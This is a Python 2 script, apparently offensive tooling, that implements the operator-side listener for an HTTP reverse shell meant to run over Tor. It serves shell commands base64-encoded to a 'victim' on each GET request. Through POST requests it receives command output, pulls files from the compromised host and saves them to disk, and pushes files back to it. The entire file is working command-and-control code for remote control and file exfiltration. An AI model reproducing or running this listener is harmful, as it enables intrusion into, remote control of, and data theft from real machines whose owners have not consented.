#!/usr/bin/python

#   Author = j0lly
#   BSD License
#
#   this code is an enanchment of an http encrypted reverse python shell and listener from:
#
#         Dave Kennedy (ReL1K) http://www.secmaniac.com
#
#   most of the code come from him, I've just lean it and added the option to work with tor network.
#   The idea of a toryfied connection like this is not mine either, but come from:
#
#        Xavier Garcia http://www.shellguardians.com
#

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urlparse, re, os, base64, binascii, tempfile

# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)

class GetHandler(BaseHTTPRequestHandler):

        # save downloaded file to disk
        def download_file(self,file_contents):
                if file_contents != "":
                    fd, tmpPayload = tempfile.mkstemp(prefix="repythor")
                    os.close(fd)
                    print "Saving file to %s ..." % tmpPayload
                    fd=open(tmpPayload,'w')
                    fd.write(binascii.unhexlify(file_contents))
                    fd.close()

                else: print "file does not exist"

        def upload_file(self,doc):
                if doc=="":
                    print "We need a file as a parameter"
                else:
                    print "trying to upload %s" % doc
                    if not os.path.isfile(doc):
                        print "%s does not exist" % doc
                    else:
                        fd=open(doc,'rb')
                        file_contents=fd.read()
                        fd.close()
                        return binascii.hexlify(file_contents)

        # handle get request
	def do_GET(self):

		# this will be our shell command
		message = raw_input("shell> ")
		# send a 200 OK response
        	self.send_response(200)
		# end headers
        	self.end_headers()
                if message[0:6] == "upload" :
                    message = "upload %s" % self.upload_file(message[7:])
		# base64 it
		message = base64.b64encode(message)
		# write our command shell param to victim
        	self.wfile.write(message)
		# return out
        	return

	# handle post request
	def do_POST(self):

	        # send a 200 OK response
        	self.send_response(200)
		# # end headers
        	self.end_headers()
		# grab the length of the POST data
                length = int(self.headers.getheader('content-length'))
		# read in the length of the POST data
                qs = self.rfile.read(length)
		# url decode
                url=urldecode(qs)
                if url[0:4] == "cmd=" :
                    # remove the parameter cmd
                    url=url.replace("cmd=", "")
		    # base64 decode
		    message = base64.b64decode(url)
		    # display the command back decrypted
		    print message
                elif url[0:4] == "dwl=" :
                    print 'Downloading.. '
                    url=url.replace("dwl=", "")
		    # base64 decode
		    message = base64.b64decode(url)
                    self.download_file(message)
                elif url[0:4] == "upl=" :
                    print 'Uploading.. '
                    url=url.replace("upl=", "")
		    # base64 decode
		    message = base64.b64decode(url)
                    if message == "" :
                        print "Error uploading file"
                    else :
                        print "File uploaded to %s" % binascii.unhexlify(message)

if __name__ == '__main__':

	# bind to all interfaces
    	server = HTTPServer(('', 8080), GetHandler)
	print """############################################
#
#
# Tor Reverse HTTP Listener by:
#
#        j0lly
#
#
############################################"""
    	print 'Starting Tor web shell server, use <Ctrl-C> to stop'
	# simple try block
	try:
		# serve and listen forever
	    	server.serve_forever()
	# handle keyboard interrupts
	except KeyboardInterrupt:
		print "[!] Exiting the webserver shell.. "
